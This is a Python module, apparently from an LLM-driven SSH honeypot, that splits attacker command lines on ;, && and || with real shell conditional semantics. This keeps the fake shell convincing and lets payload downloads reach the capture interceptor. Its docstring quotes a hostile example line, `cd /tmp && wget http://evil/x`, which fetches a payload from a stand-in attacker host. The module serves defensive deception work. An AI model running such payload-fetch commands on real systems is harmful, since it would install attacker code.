# SPDX-License-Identifier: BSD-3-Clause

# ABOUTME: Splits a command line into sequenced segments on ; && ||, with
# ABOUTME: the conditional semantics a real shell applies. Exists because
# ABOUTME: the fastpath used to dispatch on the first whitespace token and
# ABOUTME: discard the rest, so `cd /tmp && wget X` put the whole string in
# ABOUTME: the prompt and threw the payload fetch away. Pure: no I/O.

"""Shell chain splitting with real conditional semantics.

The bug this exists to fix, exactly: `_try_fastpath` did
``stripped.split(None, 1)`` and passed everything after the verb to
``_handle_cd``, which accepts any string beginning with ``/`` as a
directory. So::

    cd /tmp || cd /var/run || cd /

set the working directory to that entire string, and the prompt rendered
it verbatim::

    root@host:/tmp || cd /var/run || cd /#

No shell does that. It is a one-command detection, and it also silently
discarded payload fetches: `cd /tmp && wget http://evil/x` never reached
the download interceptor, so the artefact we exist to capture was lost.

``responder._METACHARS`` already listed the right operators. The fastpath
simply never consulted it — that asymmetry was the whole defect.

Conditional semantics matter here, they are not a refinement. Real bash
runs `cd /tmp || cd /var/run` as *one* command: `||` only fires when the
left side fails. A splitter that ran both would relocate the attacker to
`/var/run` and be its own, subtler tell.
"""

from __future__ import annotations

#: Constructs we do not model. A segment containing one of these is not a
#: simple command, so the fastpath must decline it and let the LLM narrate
#: the whole line. Pipes are absent deliberately — pipefilters handles
#: those inside a segment.
UNSUPPORTED = ("$(", "`", ">", "<", "\n")

#: Joining operators, longest first so `&&` is matched before `&`.
_OPERATORS = ("&&", "||", ";")

_MAX_SEGMENTS = 8


def split_chain(line: str) -> list[tuple[str, str]] | None:
    """Split ``line`` into ``(operator, command)`` pairs.

    ``operator`` is what joins this segment to the previous one — ``""``
    for the first. Quotes are respected, so ``echo "a && b"`` stays whole.

    Returns a single-element list when there is no chaining, so callers can
    treat the simple case identically. Returns None when the line is not
    something we should split at all: an empty segment (``cd /tmp &&``), a
    backgrounding ``&``, or more segments than any real attacker line has.
    """
    if not line or not line.strip():
        return None

    segments: list[tuple[str, str]] = []
    current: list[str] = []
    operator = ""
    quote: str | None = None
    i = 0

    while i < len(line):
        ch = line[i]

        if quote:
            current.append(ch)
            if ch == quote:
                quote = None
            i += 1
            continue

        if ch in ("'", '"'):
            quote = ch
            current.append(ch)
            i += 1
            continue

        if ch == "\\" and i + 1 < len(line):
            current.append(line[i : i + 2])
            i += 2
            continue

        matched = next((op for op in _OPERATORS if line.startswith(op, i)), None)
        if matched:
            segments.append((operator, "".join(current).strip()))
            operator = matched
            current = []
            i += len(matched)
            continue

        # A lone `&` backgrounds the command. The protocol handles that
        # case separately, so decline rather than mis-split it.
        if ch == "&":
            return None

        current.append(ch)
        i += 1

    if quote:
        return None  # unterminated quote — let the LLM narrate it
    segments.append((operator, "".join(current).strip()))

    if any(not cmd for _op, cmd in segments):
        return None  # `cd /tmp &&` or `; ls` — malformed, defer
    if len(segments) > _MAX_SEGMENTS:
        return None
    return segments


def should_run(operator: str, previous_succeeded: bool) -> bool:
    """Whether a segment runs, given how it is joined and what came before.

    This is what makes `cd /tmp || cd /var/run || cd /` behave: the first
    succeeds, so neither fallback runs, and the session ends up in /tmp
    exactly as it would on a real box.
    """
    if operator == "&&":
        return previous_succeeded
    if operator == "||":
        return not previous_succeeded
    return True  # ";" or the first segment


def is_simple(command: str) -> bool:
    """True when a segment is a single command we can dispatch locally.

    Guards the fastpath, which previously accepted any line whose first
    token happened to be a fastpath verb.
    """
    return bool(command) and not any(u in command for u in UNSUPPORTED)
